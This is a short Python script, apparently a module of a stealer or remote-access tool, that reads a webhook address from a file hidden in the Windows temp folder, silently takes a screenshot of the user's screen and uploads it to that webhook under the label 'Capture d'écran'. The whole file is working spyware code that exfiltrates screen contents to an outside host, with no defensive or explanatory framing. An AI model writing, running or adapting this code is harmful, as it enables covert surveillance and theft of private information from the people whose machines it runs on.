import os
import pyautogui
import requests
from io import BytesIO

webhook_path = os.path.join(os.getenv('TEMP'), 'config', 'webhook.txt')

try:
    with open(webhook_path, 'r') as file:
        webhook_url = file.read().strip()
except FileNotFoundError:
    exit()

screenshot = pyautogui.screenshot()

buffer = BytesIO()
screenshot.save(buffer, format="PNG")
buffer.seek(0)

files = {
    'file': ('screenshot.png', buffer, 'image/png')
}
data = {
    "username": "📸 Capture d'écran"
}

requests.post(webhook_url, data=data, files=files)
